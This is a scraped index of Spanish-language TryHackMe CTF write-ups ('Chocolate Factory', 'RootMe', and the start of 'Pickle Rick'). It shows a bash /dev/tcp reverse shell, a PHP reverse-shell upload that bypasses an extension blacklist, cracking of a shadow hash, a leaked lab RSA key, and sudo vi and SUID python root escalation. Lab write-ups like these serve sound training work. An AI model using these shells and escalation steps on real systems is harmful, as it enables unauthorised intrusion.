___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 106/tcp open pop3pw? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 107/tcp open rtelnet? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 108/tcp open snagas? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 109/tcp open pop2? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 110/tcp open pop3? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 111/tcp open rpcbind? | fingerprint-strings: | NULL, RPCCheck: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 112/tcp open mcidas? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 113/tcp open ident? | fingerprint-strings: | DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: |_ http://localhost/key_rev_key \u0026lt;- You will find the key here!!! 114/tcp open audionews? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 115/tcp open sftp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 116/tcp open ansanotify? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 117/tcp open uucp-path? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 118/tcp open sqlserv? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 119/tcp open nntp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 120/tcp open cfdptkt? | fingerprint-strings: | GetRequest, HTTPOptions: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 121/tcp open erpc? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 122/tcp open smakynet? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 123/tcp open ntp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 124/tcp open ansatrader? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 125/tcp open locus-map? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Con el whatweb podemos ver más información de la web\n❯ whatweb 10.10.250.47 http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.47], PasswordField[password] Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.\nEl wappalayzer no reporta nada interesante.\nPuerto 21 El nmap reporto que se podía entrar al puerto 21 como anónimo (ftp-anon: Anonymous FTP login allowed)\n❯ ftp 10.10.250.47 Connected to 10.10.250.47. 220 (vsFTPd 3.0.3) Name (10.10.250.47:d3b0): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; Dentro solo hay una foto gum_room.jpg, con get gum_room.jpg nos la podemos pasar a nuestra máquina, la foto es la siguiente:\nPara ver si hay algo oculto en la foto usamos steghide\nSteghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.\nNo notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.\n#Si no tienes instalado el \u0026#34;steghide\u0026#34; lo puedes descargar con sudo apt install steghide ❯ steghide extract -sf gum_room.jpg Anotar salvoconducto: anot� los datos extra�dos e/\u0026#34;b64.txt\u0026#34;. Ahora se a creado un archivo b64.txt que está encriptado con base64\ncat b64.txt | base64 -d \u0026gt; decode.txt Ahora en el decode.txt ya está el contenido\n... ... charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::: Esto parece ser el /etc/shadow\nEl fichero /etc/shadow almacena las contraseñas de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene información sobre las contraseñas de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto\nAl final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)\nPara romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix\nsudo apt install john echo \u0026#34;hash\u0026#34; \u0026gt; myhash.hash john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash john --show mihash.hash home.php Esto nos devuelve el usuario charlie con la contraseña, al probarlos en la web, nos lleva a otra página.\nDesde aquí se pueden ejecutar comandos a la máquina víctima.\nReverse shell Primero nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Intentamos crear una reverse shell mandando bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1, pero no recibimos nada, probamos añadiendo (bash -c \u0026ldquo;\u0026rdquo;) de tal forma que quede así bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot; Ahora ya si\nTratamiento de la tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada a charlie En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.\nUna llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.\nDesde nuestra máquina guardamos esa key en un archivo llamado id_rsa\n❯ cat id_rsa ───────┬────────────────────────────────────────────────────────────────────────────────── │ File: id_rsa ───────┼────────────────────────────────────────────────────────────────────────────────── 1 │ -----BEGIN RSA PRIVATE KEY----- 2 │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 3 │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb 4 │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj 5 │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY 6 │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE 7 │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej 8 │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 9 │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF 10 │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl 11 │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ 12 │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 13 │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T 14 │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF 15 │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA 16 │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ 17 │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 18 │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB 19 │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB 20 │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 21 │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 22 │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv 23 │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb 24 │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM 25 │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm 26 │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln 27 │ -----END RSA PRIVATE KEY----- ───────┴────────────────────────────────────────────────────────────────────────────────── Ahora nos podemos conectar por ssh como charlie\nssh -i id_rsa charlie@10.10.94.87 Ya somos charlie y podemos ver la flag de usuario\nEscalada root Con sudo -l podemos ver todos los comandos que charlie puede ejecutar. Ahí podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseña\nvi (Visual) es un programa que entra en la categoría de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cómo quedará el documento impreso. Por esto carece de opciones como centrado o justificación de párrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir código.\nEjecutar vi como root\nsudo vi\nctrl + c\nY por último escribir :shell en la linea de abajo\n:shell\n¡Ya somos root!\nroot.py (Puertos 100 - 125) En el directorio /root hay un archivo llamado root.py el cual al ejecutarlo pyhton root.py pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:\n\u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; Menos uno, el 113, que pone:\nhttp://localhost/key_rev_key \u0026lt;- You will find the key here!!! Cuando entramos al http://10.10.94.87/key_rev_key nos descarga un archivo llamado key_rev_key, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc\u0026hellip; pero nada.\nchmod +x key_rev_key ❯ ./key_rev_key Enter your name: charlie Bad name! Al hacer un nano al archivo hay una línea que pone:\ncongratulations you have found the key: ^@^@^@^@b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39;^@` ¡Ya tenemos la key!\nTambién hay otra línea en la cual se puede ver el nombre correcto\nEnter your name: \u0000%s\u0000 laksdhfas\u0000\u0000 ❯ ./key_rev_key Enter your name: laksdhfas congratulations you have found the key: b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39; Keep its safe Root flag Ahora ya podemos ejecutar el root.py que está en /root y poner la key.\n¡Nos responde con la flag de root!\n","date":"2022-12-13","id":96,"permalink":"/writeups/tryhackme/chocolate-factory/","summary":"Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.","tags":["CTF","Fácil","Linux","Archivos ocultos","vi","hash sha512"],"title":"Chocolate Factory"},{"content":"","date":"2022-12-13","id":97,"permalink":"/tags/hash-sha512/","summary":"","tags":[],"title":"hash sha512"},{"content":"","date":"2022-12-13","id":98,"permalink":"/tags/vi/","summary":"","tags":[],"title":"vi"},{"content":"Un ctf para principiantes, me puedes rootear?\nhttps://tryhackme.com/room/rrootme\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.108.243\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.108.243 PING 10.10.108.243 (10.10.108.243) 56(84) bytes of data. 64 bytes from 10.10.108.243: icmp_seq=1 ttl=63 time=77.9 ms --- 10.10.108.243 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 77.935/77.935/77.935/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.108.243 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPort ───────┬──────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.108.243 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.108.243 -oN target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4ab916884c25448ba5cfd3f2252214 (RSA) | 256 a9a686e8ec963f003cd16d54973082 (ECDSA) |_ 256 22f6b5a654d9787c26035a953f9dfcd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HackIT - Home | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Web Con el whateb podemos ver info sobre a web\n❯ whatweb 10.10.108.243 http://10.10.108.243 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.108.243], Script, Title[HackIT - Home] Al entrar a la web solo se ve texto\nBuscando subdirectorios (wfuzz) Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.108.243/FUZZ Parámetro Función -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no nos reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario El wfuzz nos reporta lo siguiente\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000550: 301 9 L 28 W 312 Ch \u0026#34;css\u0026#34; 000000953: 301 9 L 28 W 311 Ch \u0026#34;js\u0026#34; 000005520: 301 9 L 28 W 314 Ch \u0026#34;panel\u0026#34; 000000164: 301 9 L 28 W 316 Ch \u0026#34;uploads\u0026#34; 000095524: 403 9 L 28 W 278 Ch \u0026#34;server-status\u0026#34; Al entrar al /panel se ve un sitio para subir archivos\nProbamos con subir una foto random, y vemos que aparece en el /uploads\nVulnerabilidad web Viendo esto vamos a intentar subir un archivo .php para crear una reverse shell, este archivo es de pentestmonkey https://github.com/pentestmonkey/php-reverse-shell\nPrimero lo pasamos a nuestra máquina\ngit clone https://github.com/pentestmonkey/php-reverse-shell Después nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Y ahora lo subimos el archivo a /panel\n¡Error!\nNo acepta archivos php, Los administradores pueden hacer una lista negra de extensiones de archivos específicas y evitar que los usuarios carguen archivos con extensiones que se consideran peligrosas. Esto se puede omitir mediante el uso de extensiones alternativas o incluso no relacionadas.\nEjemplo extensiones php \u0026mdash;\u0026gt; .phtml, .php3, .php4, .php5\nVamos a probar con la primera (.phtml), le cambiamos el nombre al archivo, de php-reverse-shell.php a php-reverse-shell.phtml\nAhora ya le gusta\nDesde /uploads le damos al archivo que hemos subido y recibimos una conexión\n❯ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.108.243] 37418 Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 13:52:50 up 48 min, 0 users, load average: 0.00, 0.00, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ Tratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Flags En /var/wwwesta la primera flag user.txt\nLa flag de root está en el /root, pero no tenemos permisos para acceder, Con el comando history, se pueden ver dos comandos interesantes\u0026hellip;\n10 find / -perm /4000 11 python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; El comando find / -perm /4000 lo que hace es buscar todos los programas con permiso SUID, en este caso python tiene permiso SUID\n¿Qué es el permiso SUID?\nHay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta. Un ejemplo es el comando passwd, el cual necesita tener privilegios de root, ya que tiene que acceder a los ficheros /etc/passwd o /etc/shadow en modo escritura. Estos programas constituyen un peligro potencial en un sistema, ya que si se hace un mal uso de ellos y el propietario tiene privilegios, root, el que lo ejecuta podrá hacer en el sistema todo lo que el propietario del programa tenga permitido.\nEl comando python -c 'import os; os.execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-p\u0026quot;)' lo que hace es spawnear una bash y como python se ejecuta como root, la bash que spawnea es como root\nAhora ya podemos ver la flag con cat /root/root.txt\n","date":"2022-12-11","id":99,"permalink":"/writeups/tryhackme/rootme/","summary":"Un ctf para principiantes, me puedes rootear?\nhttps://tryhackme.com/room/rrootme\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.108.243\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","python","file upload"],"title":"RootMe"},{"content":"Un CTF de Rick y Morty. ¡Ayuda a que Rick vuelva a ser humano!\nhttps://tryhackme.com/room/picklerick\nEste desafío temático de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en un ser humano a partir de un pepinillo.\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.26.25\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.26.25 PING 10.10.26.25 (10.10.26.25) 56(84) bytes of data. 64 bytes from 10.10.26.25: icmp_seq=1 ttl=63 time=63.6 ms --- 10.10.26.25 ping statistics --- 1 